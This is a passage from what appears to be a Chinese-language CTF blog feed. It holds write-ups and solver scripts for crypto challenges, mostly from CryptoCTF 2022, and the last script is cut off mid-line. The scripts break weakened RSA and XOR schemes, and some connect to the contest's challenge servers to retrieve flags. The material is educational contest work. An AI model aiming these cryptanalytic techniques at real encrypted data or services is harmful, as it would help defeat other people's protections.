class="line"></span><br><span class="line"><span class="built_in">print</span>(dehash(<span class="string">&#x27;GTgC3xzo&#x27;</span>, <span class="string">&#x27;00000000000000000000&#x27;</span>))</span><br></pre></td></tr></table></figure><p>题目给r =a*b+c，已知r，a，c要求b，只不过这里的abcr都是在模2的多项式下的，sage直接除会显示分式，应该是要给个模</p><p>nc后发现r的最高次都是14，a的是7，那么b的最高位也是7，爆破就能出，复杂度为2^8，很快</p><p>但是因为之前看代码用了太多时间，加上有点紧张，于是是手动40次出的（x</p><p>爆破代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">R = PolynomialRing(GF(<span class="number">2</span>),<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">r = x^<span class="number">14</span> + x^<span class="number">12</span> + x^<span class="number">10</span> + x^<span class="number">8</span> + x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x</span><br><span class="line">a = x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">4</span> + x + <span class="number">1</span></span><br><span class="line">c = x^<span class="number">6</span> + x^<span class="number">3</span> + x</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">for</span> i8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                b = i1 + i2*x + i3*x^<span class="number">2</span> + i4*x^<span class="number">3</span> + i5*x^<span class="number">4</span> + i6*x^<span class="number">5</span> + i7*x^<span class="number">6</span> + i8*x^<span class="number">7</span></span><br><span class="line"><span class="comment">#                                 print(b)</span></span><br><span class="line">                                <span class="keyword">if</span> b*a == r-c:</span><br><span class="line">                                    <span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h1 id="asr">ASR</h1><p>生成没什么说法，先开根，然后用yafu一顿暴力分解，多开几个挂1个多小时，然后分出来了。可惜还是慢了，第五出的没拿到血</p><p>分解之后要分析一下：e | P2 and e |P4，本来想的是分别开根然后crt。但是P1和P3已经凑够了512位，如果m也达到这个位数，那len(m)就有64位了，题目给的len是48，因此可直接用P1和P3出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P1 = <span class="number">223213222467584072959434495118689164399</span></span><br><span class="line">P2 = <span class="number">218566259296037866647273372633238739089</span></span><br><span class="line">P3 = <span class="number">260594583349478633632570848336184053653</span></span><br><span class="line">P4 = <span class="number">225933944608558304529179430753170813347</span></span><br><span class="line"></span><br><span class="line">phi = P1*(P1-<span class="number">1</span>)*P2*(P2-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)*P4*(P4-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> P1**<span class="number">2</span>*P2**<span class="number">2</span>*P3**<span class="number">2</span>*P4**<span class="number">2</span> == n</span><br><span class="line"></span><br><span class="line">phi_ = P1*(P1-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)</span><br><span class="line">d0 = inverse_mod(e, phi_)</span><br><span class="line">m0 = <span class="built_in">pow</span>(c, d0, P1^<span class="number">2</span>*P3^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># d1 = nthroot_mod(c,e,P2^2,all_roots=True)</span></span><br><span class="line"><span class="comment"># d2 = nthroot_mod(c,e,P4^2,all_roots=True)</span></span><br><span class="line">long_to_bytes(m0)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做了四道，获得了18名&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CCTF</title>
    <link href="http://sh1k4ku.github.io/2022/07/17/2022/CCTF/"/>
    <id>http://sh1k4ku.github.io/2022/07/17/2022/CCTF/</id>
    <published>2022-07-17T08:56:12.000Z</published>
    <updated>2022-07-19T14:45:31.200Z</updated>
    
    <content type="html"><![CDATA[<p>复盘咯</p><span id="more"></span><h1 id="warm-up">WARM-UP</h1><h2 id="mic-check">Mic Check</h2><p>点进去就有</p><h1 id="easy">EASY</h1><h2 id="klamkin">Klamkin</h2><p>求一元一次方程的解，给了一组x、y，直接移位就有了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;04.cr.yp.toc.tf&#x27;</span>, <span class="number">13777</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">r = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">s = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(q,r,s)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;that &#x27;</span>)</span><br><span class="line">    u = io.recvuntil(<span class="string">b&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;-&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">if</span> u == <span class="string">b&#x27;x&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(r, q) * s) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) + <span class="string">&#x27;, &#x27;</span> + <span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)))</span><br><span class="line">    <span class="keyword">elif</span> u == <span class="string">b&#x27;y&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(s, q) * r) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)) + <span class="string">&#x27;, &#x27;</span> +  <span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;f1nDin9_In7Eg3R_50Lut1Ons_iZ_in73rEStIn9!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="baphomet">Baphomet</h2><p>’CCTF‘爆破key，截前面一部分key解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">msg = <span class="string">&#x27;CCTF&#123;&#x27;</span></span><br><span class="line">ba = b64encode(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">baph = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> ba.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> b.islower():</span><br><span class="line">        baph += b.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        baph += b.lower()</span><br><span class="line">baph = baph.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(baph)</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(baph)):</span><br><span class="line">    key += (baph[i] ^ c[i]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">key = key[:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    flag += (c[i] ^ key[i % <span class="built_in">len</span>(key)]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> f.islower():</span><br><span class="line">        msg += f.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg += f.lower()</span><br><span class="line">msg = msg.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(msg))</span><br><span class="line"><span class="comment">#b&#x27;CCTF&#123;UpP3r_0R_lOwER_17Z_tH3_Pr0bL3M&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="medium-easy">MEDIUM-EASY</h1><h2 id="sots">sots</h2><p><code>He who abides far away from his home, is ever longing for the day he shall return.</code></p><p>求<span class="math display">\[x^2+y^2=n, n已知\]</span></p><p>丢番图方程，可以用<a href="https://www.alpertron.com.ar/QUAD.HTM">在线网站</a>解，也可以调库two_square()</p><p>梭了</p><p>CCTF{3Xpr3sS_4z_Th3_sUm_oF_7w0_Squ4rE5!}</p><h2 id="polyrsa">polyRSA</h2><p>直接roots</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line">n = <span class="number">44538727182858207226040251762322467288176239968967952269350336889655421753182750730773886813281253762528207970314694060562016861614492626112150259048393048617529867598499261392152098087985858905944606287003243</span></span><br><span class="line">c = <span class="number">37578889436345667053409195986387874079577521081198523844555524501835825138236698001996990844798291201187483119265306641889824719989940722147655181198458261772053545832559971159703922610578530282146835945192532</span></span><br><span class="line"></span><br><span class="line">P = PolynomialRing(ZZ, <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">k = P.gen()</span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">f = p*q -n</span><br><span class="line">x = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment">#k = 9291098683758154336</span></span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><h2 id="infinity-castle">infinity castle</h2><p>diamond是平方，triage是立方，summarize是对<span class="math display">\[\sqrt{n}\]</span>进行积分，find是计算泰勒级数<span class="math display">\[summarize返回的值\approx \frac{\sqrt{2}}{2}+\sqrt{3}+\sqrt{4}+···+\frac{\sqrt{n}}{2}\\所以是\sqrt{n}从2到n的积分\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2  <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">cip, key</span>):</span><br><span class="line">repeation = <span class="number">1</span> + (<span class="built_in">len</span>(cip) // <span class="built_in">len</span>(key))</span><br><span class="line">key = key * repeation</span><br><span class="line">key = key[:<span class="built_in">len</span>(cip)]</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">bytes</span>([c ^^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cip, key)])</span><br><span class="line"><span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diamond</span>(<span class="params">num</span>): <span class="comment">#平方</span></span><br><span class="line"><span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">triage</span>(<span class="params">num</span>):<span class="comment">#立方</span></span><br><span class="line"><span class="keyword">return</span> num ** <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summarize</span>(<span class="params">b</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>/<span class="number">3</span> * b**(<span class="number">3</span>/<span class="number">2</span>) - <span class="number">2</span>/<span class="number">3</span> * <span class="number">2</span>**(<span class="number">3</span>/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">c0 = <span class="number">194487778980461745865921475300460852453586088781074246328543689440168930873549359227127363759885970436167330043371627413542337857082400024590112412164095470165662281502211335756288082198009158469871465280749846525326701136380764079685636158337203211609233704905784093776008350120607841177268965738426317288541638374141671346404729428158104872411498098187946543666987926130124245185069569476433120128275581891425551325847219504501925282012199947834686225770246801353666030075146469275695499044424390475398423700504158154044180028733800154044746648133536737830623670383925046006108348861714435567006327619892239876863209887013290251890513192375749866675256952802329688897844132157098061758362137357387787072005860610663777569670198971946904157425377235056152628515775755249828721767845990597859165193162537676147173896835503209596955703313430433124688537275895468076469102220355973904702901083642275544954262724054693167603475188412046722656788470695566949847884250306735314144182029335732280420629131990311054229665691517003924788583771265625694414774865289407885678238795596912006567817508035434074250123869676396153982762032750080222602796273083162627489526255501643913672882350236497429678928099868244687228703074267962827621792960</span></span><br><span class="line">c1 = <span class="number">102325064080381160170299055162846304227217463467232681115953623386548494169967745781550171804781503102663445039561476870208178139548389771866145006535051362059443515034504958703659546162037904784821960707630188600064568878674788077706711506213779443920430038560373854184526850365974450688458342413544179732143225845085164110594063440979455274250021370090572731855665413325275414458572412561502408983107820534723804225765540316307539962199024757378469001612921489902325166003841336027940632451584642359132723894801946906069322200784708303615779699081247051006259449466759863245508473429631466831174013498995506423210088549372249221415401309493511477847517923201080509933268996867995533386571564898914042844521373220497356837599443280354679778455765441375957556266205953496871475611269965949025704864246188576674107448587696941054123618319505271195780178776338475090463487960063464172195337956577785477587755181298859587398321270677790915227557908728226236404532915215698698185501562405374498053670694387354757252731874312411228777004316623425843477845333936913444143768519959591070492639650368662529749434618783626718975406802741753688956961837855306815380844030665696781685152837849982159679122660714556706669865596780528277684800454866433826417980212164051043504955615794706595412705883261111953152250227679858538249797999044336210905975316421254442221408945203647754303635775048438188044803368249944201671941949138202928389951227347433255867504906597772044398973241425387514239164853656233776024571606159378910745571588836981735827902305330330946219857271646498602227088657739442867033212012876837654750348578740516798444734534291467314881324902354425889448102902750077077381896216130734894767553834949561471219923459897244690006643798812989271282475503126962274052192342840870308710338336817452628324667507548265612892611100350882163205858101959976</span></span><br><span class="line">enc = <span class="number">122235247669762131006183252122503937958296387791525458429403709404875223067116491817728568224832483391622109986550732469556761300197133827976956875865159629512476600711420561872409721582387803219651736262581445978042694384374119142613277808898398213602093802571586386354257378956087240174787723503606671543195193114158641301908622673736098768829071270132073818245595918660134745516367731595853832524328488074054536278197115937409643221809577554866060292157239061557708159310445977052686561229611117673473208278176118561352693319461471419694590218295911647368543698198762827636021268989705079848502749837879584394379300566277359149621932579222865430374652678738198451655509408564586496375811666876030847654260305392984710580761255795785508407844683687773983669843744274915862335181251050775093896006210092665809300090715190088851654138383362259256212093670748527819287681468901379286722214112321906917311154811516336259463356911326393701445497605365038857575515541024824906818473933597129846235905072394148879079996812146836910199111439031562946495046766063326815863624262541346543552652673629442370320109404700346028639853707278295255350982238521659924641921142615894039995513480511108116053798143154593343124822462519555715118822045</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pandq = iroot(c1,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> c0 % pandq == <span class="number">0</span></span><br><span class="line">p_q = c0 // pandq</span><br><span class="line">p = (pandq + p_q) // <span class="number">2</span></span><br><span class="line">q = pandq - p</span><br><span class="line"><span class="keyword">assert</span> c1 == (p + q) ** <span class="number">3</span></span><br><span class="line">n = <span class="built_in">int</span>(p * q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">xor_key = long_to_bytes(<span class="built_in">int</span>(summarize(n)))</span><br><span class="line">enc = long_to_bytes(<span class="built_in">pow</span>(enc, d, n))</span><br><span class="line">flag = xor(enc, xor_key) </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#CCTF&#123;Mix1ng_c4lcUluS_w17h_Numb3r_The0Rry_S33ms_s7r0ng_cRyp70_Sch3m4!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="keydream">keydream</h2><p>给两头的copper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">23087202318856030774680571525957068827041569782431397956837104908189620961469336659300387982516148407611623358654041246574100274275974799587138270853364165853708786079644741407579091918180874935364024818882648063256767259283714592098555858095373381673229188828791636142379379969143042636324982275996627729079</span></span><br><span class="line">c = <span class="number">3621516728616736303019716820373078604485184090642291670706733720518953475684497936351864366709813094154736213978864841551795776449242009307288704109630747654430068522939150168228783644831299534766861590666590062361030323441362406214182358585821009335369275098938212859113101297279381840308568293108965668609</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p_high = bytes_to_long(<span class="string">b&#x27;CCTF&#123;it_is_fake_flag_&#x27;</span>)</span><br><span class="line">p_low = bytes_to_long(<span class="string">b&#x27;_90OD_luCk___!!&#125;&#x27;</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p_high * <span class="number">2</span>^(<span class="number">43</span>*<span class="number">8</span>) + x * <span class="number">2</span>^(<span class="number">16</span>*<span class="number">8</span>) + p_low</span><br><span class="line">roots = f.monic().small_roots(X = <span class="number">2</span>^(<span class="number">27</span>*<span class="number">8</span>), beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(f(roots[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">assert</span> n%p == <span class="number">0</span></span><br><span class="line">q = n//p</span><br><span class="line">d = inverse_mod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;Congratz, the flag is: CCTF&#123;h0M3_m4dE_k3Y_Dr1vEn_CrYp7O_5ySTeM!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="jeksign">jeksign</h2><p><span class="math display">\[1337(z^4 - x^2) = 31337(y^2 - z^4)\\a(z^4 - x^2) = b(y^2 - z^4)\\\therefore (a+b)z^4 = ax^2+by^2\\令x=y=z^2，得到恒等式\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">nc = remote(<span class="string">&#x27;02.cr.yp.toc.tf&#x27;</span>, <span class="number">17113</span>)</span><br><span class="line">x = <span class="number">30</span></span><br><span class="line">nc.recvuntil(<span class="string">b&#x27;-bit: \n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    z = randint(<span class="number">2</span> ** (x-<span class="number">1</span>), <span class="number">2</span> ** x)</span><br><span class="line">    <span class="built_in">print</span>(z)</span><br><span class="line">    nc.sendline(<span class="built_in">str</span>(z**<span class="number">2</span>)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(z**<span class="number">2</span>)  + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(z))</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">    nc.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;4_diOpH4nT1nE_3Qua7i0n__8Y__Jekuthiel_Ginsbur!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="volgo">volgo</h2><p>明文密文一一对应，直接爆破</p><p>下面的exp是苏氨酸师傅的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;NUYXA FATCL LJSVD KOLWM NWZUG JZDPY JGOSL CBRGO BAMKL BXDZR BLXDU KUNQE CWEUO SPOZR VOJMM POXCR RPNXX SGVHW TGOWJ BDOGF AHVWF WPZGR UQKUE HASEF GKFFA QOPNQ TESLZ FACTJ JPSPL DNZYN CXSFZ&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rua</span>(<span class="params">c, i</span>):</span><br><span class="line">    pre = <span class="string">&quot;A&quot;</span> * i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        cipher = requests.post(<span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span>,</span><br><span class="line">                               data=&#123;</span><br><span class="line">                                   <span class="string">&quot;plain&quot;</span>: pre + ch</span><br><span class="line">                               &#125;).json()[<span 